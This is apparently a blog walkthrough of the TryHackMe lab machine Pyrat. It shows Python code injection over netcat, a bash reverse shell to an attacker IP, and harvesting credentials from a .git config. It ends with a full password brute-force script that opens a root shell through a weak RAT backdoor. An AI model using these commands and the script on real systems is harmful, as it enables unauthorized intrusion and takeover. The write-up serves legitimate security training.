---
title: CTF Walkthrough for TryHackMe Machine Pyrat
date: 2024-10-04 00:00:00 +0300
categories: [Walkthrough, CTF]
tags: [TryHackMe, Writeup]   
image:
  path: /assets/img/posts/walthrough/tryhackme/2024-10-04-pyrat/box-pyrat.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Pyrat a TryHackMe machine. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
### Machine Description
Name: Pyrat<br>
Difficulty: Easy<br>
Operating System: Linux<br>
Machine link: [Pyrat](https://tryhackme.com/r/room/pyrat)<br>
### Tools used
1) Nmap<br>

## Reconnaissance

We will start by performing a service scan on the target to enumerate services running on open ports.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/Pyrat/Scans/Service]
└─$ sudo nmap -n 10.10.153.86 -sV -sC -oN service-scan.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-04 07:43 BST
<SNIP>
Nmap scan report for 10.10.153.86
Host is up (0.51s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, JavaRMI, LANDesk-RC, NotesRPC, Socks4, X11Probe, afp, giop: 
|     source code string cannot contain null bytes
|   FourOhFourRequest, LPDString, SIPOptions: 
|     invalid syntax (<string>, line 1)
|   GetRequest: 
|     name 'GET' is not defined
|   HTTPOptions, RTSPRequest: 
|     name 'OPTIONS' is not defined
|   Help: 
|_    name 'HELP' is not defined
|_http-server-header: SimpleHTTP/0.6 Python/3.11.2
<SNIP>
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 195.59 seconds
```

The target runs an SSH and a simple Python HTTP server. Let's visit the web application running on port 8000.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/Pyrat/Scans/Service]
└─$ curl http://10.10.153.86:8000                                                              
Try a more basic connection  
```

There is a message that tells us to initiate a basic connection with the server. This connection can be done using Netcat.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/Pyrat/Scans/Service]
└─$ nc -nv 10.10.153.86 8000
(UNKNOWN) [10.10.153.86] 8000 (?) open
```

We have connected to the server. When we input random strings, we will receive another error message that the string is not defined.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/Pyrat/Scans/Service]
└─$ nc -nv 10.10.153.86 8000
(UNKNOWN) [10.10.153.86] 8000 (?) open
<SNIP>
ls
name 'ls' is not defined
```

Since this is a Python server, let's try to input Python code to see if this code will be executed.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/Pyrat/Scans/Service]
└─$ nc -nv 10.10.153.86 8000
(UNKNOWN) [10.10.153.86] 8000 (?) open
<SNIP>
print(5+5)
10
```

## Exploitation

The code is executed hence we can execute Python code on the target. We can use this Python code execution on the target to execute a reverse shell and obtain RCE on the target. We first need to start a listener on our attack host.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/Pyrat/Misc Files]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
```

Now that the listener is set, let's import the os module and execute a reverse shell on the target using the system() function.
```bash
import os

os.system("/bin/bash -c 'bash -i >& /dev/tcp/10.8.23.19/1234 0>&1'")
```

When we go back to our listener, we will notice a reverse connection from the target. We can upgrade this shell to a fully interactive shell using the commands below.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/Pyrat/Misc Files]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.8.23.19] from (UNKNOWN) [10.10.153.86] 60072
bash: cannot set terminal process group (583): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
www-data@Pyrat:~$ python3 -c 'import pty;pty.spawn("/bin/bash")' 
python3 -c 'import pty;pty.spawn("/bin/bash")'
bash: /root/.bashrc: Permission denied
www-data@Pyrat:~$ ^Z
zsh: suspended  nc -lvnp 1234
    
┌──(pentester㉿kali)-[~/…/Challenge/Pyrat/Scans/Service]
└─$ stty raw -echo;fg                       
[1]  + continued  nc -lvnp 1234
                               export TERM=xterm
www-data@Pyrat:~$
```

We have obtained a foothold as the www-data user. A quick enumeration of the file system will reveal a .git folder. This contains a pair of credentials for the Think local user.
```bash
www-data@Pyrat:/$ ls -la /home
total 12
drwxr-xr-x  3 root  root  4096 Jun  2  2023 .
drwxr-xr-x 18 root  root  4096 Dec 22  2023 ..
drwxr-x---  5 think think 4096 Jun 21  2023 think
www-data@Pyrat:/$ ls -la /opt
total 12
drwxr-xr-x  3 root  root  4096 Jun 21  2023 .
drwxr-xr-x 18 root  root  4096 Dec 22  2023 ..
drwxrwxr-x  3 think think 4096 Jun 21  2023 dev
www-data@Pyrat:/$ ls -la /opt/dev
total 12
drwxrwxr-x 3 think think 4096 Jun 21  2023 .
drwxr-xr-x 3 root  root  4096 Jun 21  2023 ..
drwxrwxr-x 8 think think 4096 Jun 21  2023 .git
www-data@Pyrat:/$ ls -la /opt/dev/.git/
total 52
drwxrwxr-x 8 think think 4096 Jun 21  2023 .
drwxrwxr-x 3 think think 4096 Jun 21  2023 ..
drwxrwxr-x 2 think think 4096 Jun 21  2023 branches
-rw-rw-r-- 1 think think   21 Jun 21  2023 COMMIT_EDITMSG
-rw-rw-r-- 1 think think  296 Jun 21  2023 config
-rw-rw-r-- 1 think think   73 Jun 21  2023 description
-rw-rw-r-- 1 think think   23 Jun 21  2023 HEAD
drwxrwxr-x 2 think think 4096 Jun 21  2023 hooks
-rw-rw-r-- 1 think think  145 Jun 21  2023 index
drwxrwxr-x 2 think think 4096 Jun 21  2023 info
drwxrwxr-x 3 think think 4096 Jun 21  2023 logs
drwxrwxr-x 7 think think 4096 Jun 21  2023 objects
drwxrwxr-x 4 think think 4096 Jun 21  2023 refs
www-data@Pyrat:/$ cat  /opt/dev/.git/config 
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[user]
        name = Jose Mario
        email = josemlwdf@github.com

[credential]
        helper = cache --timeout=3600

[credential "https://github.com"]
        username = think
        password = <REDACTED>
```

Let's use these credentials to log in as the local user Think. We can use this access on the system to read the user flag.
```bash
www-data@Pyrat:/$ su think 
Password: 
think@Pyrat:/$ ls /home/think/
snap  user.txt 
```

## Post Exploitation
When we look at the services running locally on the target, we will notice that port 25 is open. Port 25 is the default port for SMTP protocol so let. The presence of this protocol may indicate that mail messages can be found on the system.
```bash
think@Pyrat:/$ netstat -nlt
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 ::1:25 
```

We can browse to the default directory where mail files are stored.
```bash
think@Pyrat:/$ cd /var/mail
think@Pyrat:/var/mail$ ls
root  think  www-data

think@Pyrat:/var/mail$ cat think 
From root@pyrat  Thu Jun 15 09:08:55 2023
Return-Path: <root@pyrat>
X-Original-To: think@pyrat
Delivered-To: think@pyrat
Received: by pyrat.localdomain (Postfix, from userid 0)
        id 2E4312141; Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
Subject: Hello
To: <think@pyrat>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20230615090855.2E4312141@pyrat.localdomain>
Date: Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
From: Dbile Admen <root@pyrat>

Hello jose, I wanted to tell you that i have installed the RAT you posted on your GitHub page, i'll test it tonight so don't be scared if you see it running. Regards, Dbile Admen
```

This directory indeed contained an email sent to the Think user. This mail indicates that a tool named RAT made by Jose has been downloaded from Github to the target system and may be running. We can look at processes running on the target system to confirm if this tool is running or not.
```bash
think@Pyrat:~$ ps -aux | grep  -i rat
root         583  0.0  0.0   2608   408 ?        Ss   06:35   0:00 /bin/sh -c python3 /root/pyrat.py 2>/dev/null
root         584  2.4  2.1  21864 10576 ?        S    06:35   2:24 python3 /root/pyrat.py
root         755  1.8  2.1 587496 10328 ?        Sl   06:35   1:51 python3 /root/pyrat.py
www-data  102616  0.0  1.9  22152  9336 ?        S    07:17   0:00 python3 /root/pyrat.py
think     103218  0.0  0.1   6432   656 pts/0    S+   08:15   0:00 grep --color=auto -i pyrat
think@Pyrat:~$ 
```

Now that we have confirmed that this tool is running on the target, we can make a Google search to learn more about the tool. The keywords "pyrat.py Github Jose" will be sufficient to find the tool. 
![](/assets/img/posts/walthrough/tryhackme/2024-10-04-pyrat/pyrat-github.png)
![](/assets/img/posts/walthrough/tryhackme/2024-10-04-pyrat/pyrat-github-2.png)

This tool appears to be a CTF toolkit used to run a backdoor on the system. This toolkit can also give us admin access to the machine it's running on. This will be possible because our enumeration above reveals that the tool is run by the root user. This admin can be accessed by entering admin after connecting to the HTTP server and it is protected by a password. Let's analyse the code to understand the authentication procedure.
![](/assets/img/posts/walthrough/tryhackme/2024-10-04-pyrat/code-analyses-1.png)
![](/assets/img/posts/walthrough/tryhackme/2024-10-04-pyrat/get_admin-function.png)

We can see that the authentication is very simple. After we have typed admin and pressed Enter, we are prompted with the string *Password:* where we are supposed to enter the password. If this password is corrected we are greeted with a Welcome message otherwise we are given two other trials. We can manually attempt a brute force attack, but this will take too long. Let's automate the process with this Python script.
```python 
import socket
import sys
         
port = 8000
passfile = sys.argv[1]

with open(passfile) as f:
    for password in f:
        s = socket.socket()
        s.connect(('10.10.153.86', port))
        s.send('admin'.encode())
        
        buffer = s.recv(1024).decode()

        
        s.send(password.encode())
        response = s.recv(1024).decode()
        print(f"[-] Trying {password.strip()} ........")

        if "Welcome" in response:
            print(f"[+] Password: {password}")
            break

        s.close()
```

We can store the Python script in a file and run it with a password wordlist file. 
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Pyrat/Misc File]
└─$ python3 bruteforcer.py /usr/share/seclists/Passwords/darkweb2017-top10000.txt
[-] Trying 123456 ........
<SNIP>
[-] Trying <REDACTED> ........
[+] Password: <REDACTED>
```

We have cracked the password to access the admin endpoint. We can use this password to obtain a root shell remotely on the target and read the root flag
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Pyrat/Misc File]
└─$ nc -nv 10.10.153.86 8000 
(UNKNOWN) [10.10.153.86] 8000 (?) open
admin
Password:
<REDACTED>
Welcome Admin!!! Type "shell" to begin
shell
# whoami
whoami
root
# ls /root
ls /root
pyrat.py  root.txt  snap
# 
```

## Conclusion

Congratulations! In this walkthrough, you have learned how to exploit a remote access toolkit protected with weak passwords in this case Pyrat. This remote access toolkit could be a web shell used during a penetration testing assessment. If not well protected this could be exploited by an attacker to enter your client's environment. This machine was designed to show the danger of protecting remote access toolkits using weak credentials could seriously impact an organisation's security posture. Thanks for following up on this walkthrough. 
